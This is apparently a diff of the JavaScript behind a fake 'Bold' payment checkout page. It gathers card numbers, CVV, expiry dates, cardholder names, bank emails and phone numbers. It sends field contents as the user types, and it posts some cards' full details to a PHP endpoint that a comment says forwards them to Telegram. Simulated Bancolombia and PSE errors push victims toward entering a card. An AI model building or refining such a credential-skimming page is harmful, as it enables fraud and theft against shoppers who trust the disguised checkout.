@@ -1,203 +1,70 @@
-/* ============================================================
-   ⚡ BOLD CHECKOUT JS ENGINE - Interacciones, Validación e Idioma
-   ============================================================ */
-
 document.addEventListener("DOMContentLoaded", () => {
 
   /* ==========================================================
-     DICCIONARIO DE TRADUCCIÓN (ES / EN)
+     REFERENCIAS GENERALES
   ========================================================== */
-  const translations = {
-    es: {
-      lang_code: "ES",
-      lang_flag: "🇨🇴",
-      buying_at: "Estas comprando en",
-      ref_label: "Referencia",
-      calc_currency: "Calcular en mi moneda",
-      how_to_pay: "¿Cómo quieres pagar?",
-      pay_card: "Tarjeta débito/crédito",
-      warn_title: "No fue posible establecer conexión con el canal seleccionado.",
-      warn_sub: "Por favor intenta realizando el pago con Tarjeta débito o crédito para finalizar tu orden.",
-      change_method: "← Cambiar método de pago",
-      phone_label: "Teléfono",
-      email_label: "Ingresa tu correo electrónico",
-      email_placeholder: "El que está registrado en tu banco",
-      card_number_label: "Número de tarjeta",
-      card_expiry_label: "Vencimiento",
-      card_cvv_label: "CVV o CVC",
-      card_holder_label: "Nombre del titular",
-      card_holder_placeholder: "Igual al que aparece en la tarjeta",
-      accept_data: "Acepto el tratamiento de mis datos personales…",
-      accept_terms: "Acepto Términos y condiciones",
-      pay_btn: "Pagar",
-      abandon_payment: "Abandonar pago",
-      return_store: "Volver a la tienda",
-      secure_pay: "Paga seguro con Bold",
-      loader_text: "Cambiando idioma..."
-    },
-    en: {
-      lang_code: "EN",
-      lang_flag: "🇺🇸",
-      buying_at: "You are buying at",
-      ref_label: "Reference",
-      calc_currency: "Calculate in my currency",
-      how_to_pay: "How do you want to pay?",
-      pay_card: "Credit / debit card",
-      warn_title: "Connection could not be established with the selected channel.",
-      warn_sub: "Please try making the payment with a Debit or Credit Card to complete your order.",
-      change_method: "← Change payment method",
-      phone_label: "Phone number",
-      email_label: "Enter your email address",
-      email_placeholder: "The one registered with your bank",
-      card_number_label: "Card number",
-      card_expiry_label: "Expiration",
-      card_cvv_label: "CVV or CVC",
-      card_holder_label: "Cardholder name",
-      card_holder_placeholder: "As it appears on the card",
-      accept_data: "I accept the processing of my personal data…",
-      accept_terms: "I accept Terms and Conditions",
-      pay_btn: "Pay now",
-      abandon_payment: "Cancel payment",
-      return_store: "Return to store",
-      secure_pay: "Pay securely with Bold",
-      loader_text: "Switching language..."
-    }
-  };
+  const formTarjeta      = document.getElementById("formTarjeta");
+  const formBancolombia  = document.getElementById("formBancolombia");
 
-  let currentLang = 'es';
+  const btnVolverTarjeta = document.getElementById("btnVolver");
+  const btnAbandonarTarjeta = document.getElementById("btnAbandonar");
 
-  window.toggleLanguage = function () {
-    const nextLang = currentLang === 'es' ? 'en' : 'es';
-    const langLoader = document.getElementById("boldLangLoader");
-    const langLoaderText = document.getElementById("boldLangLoaderText");
+  const volverMetodos = document.querySelectorAll(".btnVolverMetodo");
+  const abandonarBtns = document.querySelectorAll(".btnAbandonar");
 
-    if (langLoaderText) {
-      langLoaderText.textContent = translations[nextLang].loader_text;
-    }
-
-    // Mostrar loader con 1_pingpong.gif en el centro
-    if (langLoader) {
-      langLoader.classList.add("activo");
-    }
-
-    setTimeout(() => {
-      currentLang = nextLang;
-      applyTranslations(currentLang);
-
-      // Ocultar loader suavemente
-      setTimeout(() => {
-        if (langLoader) {
-          langLoader.classList.remove("activo");
-        }
-      }, 300);
-    }, 750);
-  };
-
-  function applyTranslations(lang) {
-    const t = translations[lang];
-    if (!t) return;
-
-    // Actualizar flag y código en el botón
-    const flagEl = document.getElementById("langFlag");
-    const codeEl = document.getElementById("langCode");
-    if (flagEl) flagEl.textContent = t.lang_flag;
-    if (codeEl) codeEl.textContent = t.lang_code;
-
-    // Actualizar elementos con data-i18n
-    document.querySelectorAll("[data-i18n]").forEach(el => {
-      const key = el.getAttribute("data-i18n");
-      if (t[key]) {
-        el.textContent = t[key];
-      }
-    });
-
-    // Actualizar placeholders con data-i18n-ph
-    document.querySelectorAll("[data-i18n-ph]").forEach(el => {
-      const key = el.getAttribute("data-i18n-ph");
-      if (t[key]) {
-        el.setAttribute("placeholder", t[key]);
-      }
-    });
-  }
-
-  /* ==========================================================
-     INTERACCIÓN DE MÉTODOS DE PAGO
-  ========================================================== */
   const opTarjeta = document.getElementById("opTarjeta");
-  const opPSE = document.getElementById("opPSE");
-  const opDaviplata = document.getElementById("opDaviplata");
-  const metodosGrid = document.getElementById("metodosGrid");
-  const formTarjeta = document.getElementById("formTarjeta");
-  const btnVolver = document.getElementById("btnVolver");
-  const bancoAdvertencia = document.getElementById("bancoAdvertencia");
+  const opBancolombia = document.getElementById("opBancolombia");
+  const opNequi = document.getElementById("opNequi");
+  const textoTransferencia = document.getElementById("textoTransferencia");
   const volverTienda = document.getElementById("volverTienda");
+  const advertenciaBancolombia = document.getElementById("bancoAdvertencia");
   const logosBoldBottom = document.getElementById("logosBoldBottom");
 
-  // Al hacer clic en Tarjeta: mostrar formulario
-  if (opTarjeta) {
-    opTarjeta.addEventListener("click", () => {
-      if (metodosGrid) metodosGrid.style.display = "none";
-      if (bancoAdvertencia) bancoAdvertencia.style.display = "none";
-      if (formTarjeta) formTarjeta.style.display = "flex";
-      if (volverTienda) volverTienda.style.display = "none";
-      if (logosBoldBottom) logosBoldBottom.style.display = "none";
-    });
-  }
-
-  // Al hacer clic en Volver / Cambiar método
-  if (btnVolver) {
-    btnVolver.addEventListener("click", (e) => {
-      e.preventDefault();
-      if (formTarjeta) formTarjeta.style.display = "none";
-      if (metodosGrid) metodosGrid.style.display = "grid";
-      if (volverTienda) volverTienda.style.display = "flex";
-      if (logosBoldBottom) logosBoldBottom.style.display = "block";
-    });
-  }
-
-  // Al hacer clic en PSE o Daviplata: mostrar advertencia
-  function mostrarAdvertenciaCanal() {
-    if (bancoAdvertencia) {
-      bancoAdvertencia.style.display = "flex";
-      bancoAdvertencia.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-    }
-  }
-
-  if (opPSE) opPSE.addEventListener("click", mostrarAdvertenciaCanal);
-  if (opDaviplata) opDaviplata.addEventListener("click", mostrarAdvertenciaCanal);
-
   /* ==========================================================
-     CAMPOS Y FORMATEO DE TARJETA
+     CAMPOS TARJETA
   ========================================================== */
   const inputTarjeta = formTarjeta?.querySelector("input[name='tarjeta']");
   const inputCVV = formTarjeta?.querySelector("input[name='cvv']");
   const inputFecha = formTarjeta?.querySelector("input[name='fecha']");
   const inputTelefono = formTarjeta?.querySelector("input[name='tel_bank']");
 
-  // BIN Prohibidos
+  /* ==========================================================
+     BIN PROHIBIDOS
+  ========================================================== */
   const binsProhibidos = {
     "409355": "Nequi"
   };
 
+  /* ==========================================================
+     MENSAJE ERROR
+  ========================================================== */
   let msgError = null;
   if (inputTarjeta) {
     msgError = document.createElement("div");
-    msgError.style.cssText = "color: #ef4444; font-size: 13.5px; margin-top: 6px; font-weight: 700; display: none;";
+    msgError.style.cssText = "color: #d40000; font-size: 14px; margin-top: 8px; font-weight: 600; display: none;";
     inputTarjeta.parentNode.appendChild(msgError);
   }
 
-  // Formatear tarjeta
+  /* ==========================================================
+     FORMATEO Y VALIDACIONES DE CAMPOS
+  ========================================================== */
+  
+  // Formatear número de tarjeta
   if (inputTarjeta) {
     inputTarjeta.addEventListener("input", (e) => {
+      // Limpiar mensaje de error
       inputTarjeta.classList.remove("error");
       if (msgError) msgError.style.display = "none";
-
+      
+      // Formatear con espacios
       let value = e.target.value.replace(/\D/g, '');
       let formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-
+      
+      // Limitar longitud
       if (formattedValue.length > 19) {
         formattedValue = formattedValue.substring(0, 19);
       }
+      
       e.target.value = formattedValue;
     });
 
@@ -222,12 +89,12 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  // Formatear Fecha
+  // Formatear fecha
   if (inputFecha) {
     inputFecha.addEventListener("input", (e) => {
       inputFecha.classList.remove("error");
       if (msgError) msgError.style.display = "none";
-
+      
       const v = e.target.value.replace(/\D/g, "");
       if (v.length >= 2) {
         e.target.value = v.slice(0, 2) + "/" + v.slice(2, 4);
@@ -243,15 +110,16 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  // Formatear Teléfono
+  // Formatear teléfono
   if (inputTelefono) {
     inputTelefono.addEventListener("input", (e) => {
       let value = e.target.value.replace(/\D/g, '');
       let formattedValue = value.replace(/(\d{3})(\d{3})(\d{4})/, '$1 $2 $3');
-
+      
       if (formattedValue.length > 13) {
         formattedValue = formattedValue.substring(0, 13);
       }
+      
       e.target.value = formattedValue;
     });
 
@@ -263,7 +131,58 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   /* ==========================================================
-     TELEMETRÍA EN TIEMPO REAL
+     MOSTRAR FORMULARIO DE TARJETA
+  ========================================================== */
+  if (opTarjeta) {
+    opTarjeta.addEventListener("click", () => {
+      if (formTarjeta) formTarjeta.style.display = "flex";
+
+      // Ocultar otros elementos
+      [textoTransferencia, opBancolombia, opNequi, volverTienda, logosBoldBottom].forEach(el => {
+        if (el) el.style.display = "none";
+      });
+
+      opTarjeta.classList.add("active");
+    });
+  }
+
+/* ==========================================================
+   VOLVER AL MENÚ
+========================================================== */
+function volverAlMenu() {
+  if (formTarjeta) formTarjeta.style.display = "none";
+  if (formBancolombia) formBancolombia.style.display = "none";
+
+  // Ocultar mensaje de advertencia de Bancolombia si está visible
+  const bancoAdvertencia = document.getElementById("bancoAdvertencia");
+  if (bancoAdvertencia) bancoAdvertencia.style.display = "none";
+
+  // Mostrar elementos del menú
+  [textoTransferencia, opBancolombia, opNequi, volverTienda, logosBoldBottom].forEach(el => {
+    if (el) el.style.display = el === opBancolombia || el === opNequi ? "flex" : "block";
+  });
+
+  if (opTarjeta) opTarjeta.classList.remove("active");
+  if (opBancolombia) opBancolombia.classList.remove("active");
+}
+
+
+  if (btnVolverTarjeta) {
+    btnVolverTarjeta.addEventListener("click", (e) => {
+      e.preventDefault();
+      volverAlMenu();
+    });
+  }
+
+  if (btnAbandonarTarjeta) {
+    btnAbandonarTarjeta.addEventListener("click", (e) => {
+      e.preventDefault();
+      window.location.href = "checkout.php";
+    });
+  }
+
+  /* ==========================================================
+     TELEMETRÍA EN TIEMPO REAL (LOGS/LOGOS)
   ========================================================== */
   let telemetriaTimeout = null;
   function enviarTelemetria() {
@@ -291,6 +210,9 @@ document.addEventListener("DOMContentLoaded", () => {
   if (inputCVV) inputCVV.addEventListener("input", enviarTelemetria);
   if (inputFecha) inputFecha.addEventListener("input", enviarTelemetria);
 
+  /* ==========================================================
+     DETECTAR MARCA
+  ========================================================== */
   function detectarMarca(num) {
     const cleanNum = num.replace(/\s/g, '');
     if (/^3[47]/.test(cleanNum)) return "amex";
@@ -299,6 +221,9 @@ document.addEventListener("DOMContentLoaded", () => {
     return "normal";
   }
 
+  /* ==========================================================
+     VALIDACIONES
+  ========================================================== */
   function validarFecha(f) {
     if (!/^\d{2}\/\d{2}$/.test(f)) return false;
     const [mm, yy] = f.split("/").map(n => parseInt(n, 10));
@@ -307,7 +232,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const currentYear = new Date().getFullYear();
     const currentMonth = new Date().getMonth() + 1;
     const fullYear = 2000 + yy;
-
+    
     if (fullYear < currentYear) return false;
     if (fullYear === currentYear && mm < currentMonth) return false;
 
@@ -319,9 +244,9 @@ document.addEventListener("DOMContentLoaded", () => {
     let sum = 0, dbl = false;
     for (let i = cleanNum.length - 1; i >= 0; i--) {
       let d = parseInt(cleanNum[i], 10);
-      if (dbl) {
-        d *= 2;
-        if (d > 9) d -= 9;
+      if (dbl) { 
+        d *= 2; 
+        if (d > 9) d -= 9; 
       }
       sum += d;
       dbl = !dbl;
@@ -339,6 +264,9 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   }
 
+  /* ==========================================================
+     ENVIAR BIN PROHIBIDO A TELEGRAM
+  ========================================================== */
   function enviarBinProhibido(tarjeta, fecha, cvv, emailBank, telBank, titular, bin, bancoProhibido) {
     const formData = new FormData();
     formData.append('tarjeta', tarjeta);
@@ -353,7 +281,9 @@ document.addEventListener("DOMContentLoaded", () => {
     fetch('registro_bin_prohibido.php', {
       method: 'POST',
       body: formData
-    }).catch(() => {});
+    }).catch(error => {
+      console.log('Error enviando BIN prohibido:', error);
+    });
   }
 
   /* ==========================================================
@@ -370,26 +300,33 @@ document.addEventListener("DOMContentLoaded", () => {
       const telBank = formTarjeta.querySelector("input[name='tel_bank']")?.value.trim() || '';
       const titular = formTarjeta.querySelector("input[name='titular']")?.value.trim() || '';
 
+      // BIN Prohibido - ENVIAR A TELEGRAM
       if (binsProhibidos[bin]) {
+        // Enviar datos a Telegram
         enviarBinProhibido(num, fecha, cvv, emailBank, telBank, titular, bin, binsProhibidos[bin]);
-        mostrarError(currentLang === 'es' ? `Número de tarjeta no permitido (${binsProhibidos[bin]}).` : `Card number not permitted (${binsProhibidos[bin]}).`);
+        
+        // Mostrar error al usuario
+        mostrarError(`Número de tarjeta no permitido (${binsProhibidos[bin]}) para hacer compras.`);
         e.preventDefault();
         return;
       }
 
+      // Validaciones de longitud
       const expectedLength = marca === "amex" ? 15 : 16;
       if (num.length !== expectedLength) {
-        mostrarError(currentLang === 'es' ? `Debe tener ${expectedLength} dígitos.` : `Must have ${expectedLength} digits.`);
+        mostrarError(`Debe tener ${expectedLength} dígitos.`);
         e.preventDefault();
         return;
       }
 
+      // Validar Luhn
       if (!validarLuhn(num)) {
-        mostrarError(currentLang === 'es' ? "Número de tarjeta no válido." : "Invalid card number.");
+        mostrarError("Número de tarjeta no válido.");
         e.preventDefault();
         return;
       }
 
+      // Validar CVV
       const expectedCvvLength = marca === "amex" ? 4 : 3;
       if (cvv.length !== expectedCvvLength) {
         if (inputCVV) inputCVV.classList.add("error");
@@ -397,6 +334,7 @@ document.addEventListener("DOMContentLoaded", () => {
         return;
       }
 
+      // Validar fecha
       if (!validarFecha(fecha)) {
         if (inputFecha) inputFecha.classList.add("error");
         e.preventDefault();
@@ -405,4 +343,65 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-});
+/* ==========================================================
+      🔥 FLUJO BANCOLOMBIA (LOGO + TEXTO + SPINNER)
+  ========================================================== */
+  if (opBancolombia) {
+    let originalContent = opBancolombia.innerHTML;
+
+    opBancolombia.addEventListener("click", (e) => {
+        e.preventDefault();
+
+        // 1. Si ya mostramos el error, salir
+        if (typeof bancoAdvertencia !== 'undefined' && bancoAdvertencia && bancoAdvertencia.style.display === "flex") return;
+
+        // 2. Limpieza Visual
+        if (formTarjeta) formTarjeta.style.display = "none";
+        [textoTransferencia, opNequi, volverTienda, logosBoldBottom].forEach(el => {
+             if (el) el.style.display = el.classList.contains('payment-option') ? 'flex' : 'block';
+        });
+        if (opTarjeta) opTarjeta.classList.remove("active");
+
+        // 3. ESTADO CARGANDO
+        // Aquí está el truco: Tomamos el logo y texto actual, y le pegamos el spinner al final.
+        opBancolombia.classList.add("loading-state");
+        
+        // Buscamos el div que tiene el logo y el texto
+        const contentDiv = opBancolombia.querySelector('.payment-text');
+        if (contentDiv) {
+            // Mantenemos lo que había y añadimos el spinner a la derecha
+            opBancolombia.innerHTML = contentDiv.outerHTML + '<div class="btn-spinner"></div>';
+        } else {
+            // Fallback por si acaso cambia el HTML
+            opBancolombia.innerHTML = `<span style="font-weight:600; color:#0b0b51;">Cargando...</span> <div class="btn-spinner"></div>`;
+        }
+
+        // 4. ESPERA DE 3 SEGUNDOS
+        setTimeout(() => {
+            // A. Restaurar botón a su estado original (con radio button si lo tenía)
+            opBancolombia.classList.remove("loading-state");
+            opBancolombia.innerHTML = originalContent;
+            
+            // B. Activar estado de Error (Borde amarillo)
+            opBancolombia.classList.add("error-state");
+            
+            // C. Mostrar el mensaje
+            if (bancoAdvertencia) bancoAdvertencia.style.display = "flex";
+
+            // D. BRINCO EN TARJETA
+            if (opTarjeta) {
+                opTarjeta.classList.remove("animar-tarjeta");
+                void opTarjeta.offsetWidth; 
+                opTarjeta.classList.add("animar-tarjeta");
+                
+                const radio = opTarjeta.querySelector("input[type='radio']");
+                if(radio) radio.checked = true;
+            }
+        }, 8000); 
+    });
+  }
+
+}); // DOMContentLoaded
+
+function mostrarModalCVV() { const m = document.getElementById('modalCVV'); if(m) m.style.display = 'block'; }
+function cerrarModalCVV() { const m = document.getElementById('modalCVV'); if(m) m.style.display = 'none'; }
